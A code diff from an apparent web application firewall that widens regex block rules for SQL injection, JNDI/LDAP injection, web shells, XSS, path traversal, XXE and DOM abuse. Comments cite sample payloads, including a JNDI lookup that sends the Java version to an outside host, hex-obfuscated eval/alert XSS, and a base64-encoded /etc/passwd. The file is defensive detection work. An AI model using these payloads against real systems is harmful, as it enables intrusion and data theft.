@@ -82,17 +82,19 @@ func InitGroupPolicy() {
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)(updatexml|extractvalue|ascii|ord|char|chr|count|concat|rand|floor|substr|length|len|user|database|benchmark|analyse)\s?\(`, groupPolicyID)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)(updatexml|extractvalue|ascii|ord|char|chr|count|concat|rand|floor|substr|length|len|user|database|benchmark|analyse|sleep)\s?\(`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
 
 			//  SQL Injection Case When
+			//  previous: (?i)\(case\s+when\s+[\w\p{L}]+=[\w\p{L}]+\s+then\s+
+			//  change to: (?i)case\s+when\s+.+\s+then\s+   2025.01.18
 			groupPolicyID, err = data.DAL.InsertGroupPolicy("Basic SQL Injection Case When", 0, 200, int64(models.ChkPointURLQuery), models.Action_Block_100, true, 0, curTime)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)\(case\s+when\s+[\w\p{L}]+=[\w\p{L}]+\s+then\s+`, groupPolicyID)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)case\s+when\s+.+\s+then\s+`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -110,7 +112,7 @@ func InitGroupPolicy() {
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\s+(and|or|rlike)\s+(select|case)\s+`, groupPolicyID)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\s+(and|or|rlike)\s+\(?(select|case)\s+`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -120,6 +122,51 @@ func InitGroupPolicy() {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
 			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\s+(and|or|rlike)\s+(if|updatexml)\(`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// Basic SQL Injection Attempt 4
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("Basic SQL Injection Attempt 4", 0, 200, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			// payload: id=111 or 123=(select 1 from ...)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\s+(and|or|rlike)\s+\w+=\(select`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// Basic SQL Injection Attempt 5
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("Basic SQL Injection Attempt 5", 0, 200, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			// payload: id=1' or ''='&Submit=Submit
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)(and|or)\s+\=`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// Basic SQL Injection Attempt 6
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("Basic SQL Injection Attempt 6", 0, 200, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			// payload: id=SELECT * FROM all_tables
+			// payload: id=SELECT abc_d FROM all_tables
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)select\s+(\*|\w+)\s+from\s+`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// SQL Injection JSON
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("SQL Injection JSON", 0, 200, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			// payload: id='{"id":"L2V0Yy9wYXNzd2Q="}'
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `\{\w+\:.+\}`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -151,11 +198,22 @@ func InitGroupPolicy() {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
 
+			// LDAP Injection
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("LDAP Injection", 0, 230, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			// payload: action=${jndi:ldap://${sys:java.version}.example.com}
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\$\{(jndi|sys).+\}`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
 			groupPolicyID, err = data.DAL.InsertGroupPolicy("Web Shell", 0, 500, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)(eval|system|exec|execute|passthru|shell_exec|phpinfo)\(`, groupPolicyID)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)(eval|system|exec|execute|passthru|shell_exec|phpinfo|invoke)\(`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -174,7 +232,7 @@ func InitGroupPolicy() {
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)<(script|iframe)`, groupPolicyID)
+			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)<(script|iframe|object|param|animate|svg)`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -184,7 +242,9 @@ func InitGroupPolicy() {
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
-			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)(alert|eval|prompt)\(`, groupPolicyID)
+			// \x61\x6c\x65\x72\x74 ==> alert , \x65\x76\x61\x6c ==> eval
+			// payload example: name=parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');
+			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)(alert|eval|prompt|\\x65\\x76\\x61\\x6c|\\x61\\x6c\\x65\\x72\\x74)[\(\]]`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
@@ -199,12 +259,42 @@ func InitGroupPolicy() {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
 
+			// XSS in Referer
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("XSS in Referer", 0, 300, int64(models.ChkPointReferer), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			_, err = data.DAL.InsertCheckItem(models.ChkPointReferer, models.OperationRegexMatch, "", `(?i)(\<img\s|onerror\=|\=atob)`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
 			// Path Traversal
 			groupPolicyID, err = data.DAL.InsertGroupPolicy("Basic Path Traversal", 0, 400, int64(models.ChkPointURLQuery), models.Action_Block_100, true, 0, curTime)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
 			}
 			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `\.\./\.\./|/etc/passwd$`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// XML External Entity (XXE), 2025.01.18
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("XML External Entity (XXE)", 0, 960, int64(models.ChkPointGetPostValue), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			_, err = data.DAL.InsertCheckItem(models.ChkPointGetPostValue, models.OperationRegexMatch, "", `(?i)\x3c\!ENTITY\sxxe\sSYSTEM`, groupPolicyID)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
+			}
+
+			// DOM Abuse
+			groupPolicyID, err = data.DAL.InsertGroupPolicy("DOM Abuse", 0, 999, int64(models.ChkPointURLQuery), models.Action_Block_100, true, 0, curTime)
+			if err != nil {
+				utils.DebugPrintln("InitGroupPolicy InsertGroupPolicy", err)
+			}
+			_, err = data.DAL.InsertCheckItem(models.ChkPointURLQuery, models.OperationRegexMatch, "", `(?i)(window|document|top|parent|frames)[\.\[]`, groupPolicyID)
 			if err != nil {
 				utils.DebugPrintln("InitGroupPolicy InsertCheckItem", err)
 			}
